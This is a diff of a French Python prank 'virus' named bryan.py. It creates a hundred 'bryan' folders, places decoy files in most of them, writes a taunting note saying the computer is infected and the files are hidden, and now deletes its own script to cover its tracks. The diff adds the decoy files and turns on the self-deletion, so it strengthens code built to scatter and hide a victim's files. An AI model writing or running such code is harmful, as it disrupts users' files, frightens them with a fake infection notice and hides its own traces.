@@ -15,19 +15,12 @@ for i in range (1,101):
     if i != choix:         
         nom = "bryan" + str(i)         
         os.mkdir(nom)
+        fakef = open(nom + "/pasici.py","w+")
 
 # Rédaction du fichier texte 
 f = open("Ne_Paniquez_Pas.txt", "w+")
-f.write
-(
-"""
-Votre ordinateur a été infécté par le virus bryan.py !!!
-Tous vos fichiers ont été placés dans un des dossier bryan
-Bonne chance pour les retrouver xD HAHA ^^
--Bryan la menace.
-"""
-)
+f.write("Votre ordinateur a été infécté par le virus bryan.py !!!\nTous vos fichiers ont été placés dans un des dossier bryan\n\nBonne chance pour les retrouver xD HAHA ^^\n-Bryan la menace.")
 f.close()
 
 # Suppression du fichier python
-# os.remove("bryan" + str(choix) + "/bryan.py")
+os.remove("bryan" + str(choix) + "/bryan.py")
